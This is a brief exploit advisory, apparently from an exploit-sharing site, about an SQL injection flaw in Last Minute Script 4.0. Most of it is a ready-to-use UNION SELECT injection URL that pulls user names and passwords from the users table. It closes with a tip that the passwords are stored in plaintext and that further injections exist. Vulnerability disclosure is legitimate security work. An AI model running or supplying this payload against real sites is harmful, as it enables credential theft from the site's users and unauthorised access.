[*] DESCRIPTION:

	Last Minute Script 4.0 (and all prior versions) suffer from a multirow SQL injection flaw,
	This allows the remote attacker to execute arbitrary MySQL querys, and possibly gaining access
	to confidential information.

	below is a example.



[*] SQL Injection:

	http://site.com/index.php?cid=-1/**/UNION/**/ALL/**/SELECT/**/CONVERT(CONCAT(name,0x3a,password,0x3C62723E)/**/using/**/latin1),2,3,4/**/FROM/**/users/*



[*] NOTE/TIP:

	passwords are in plaintext.

	There are also other SQL injections around the site which i have found, So no one even bother to post has seperate vulns.
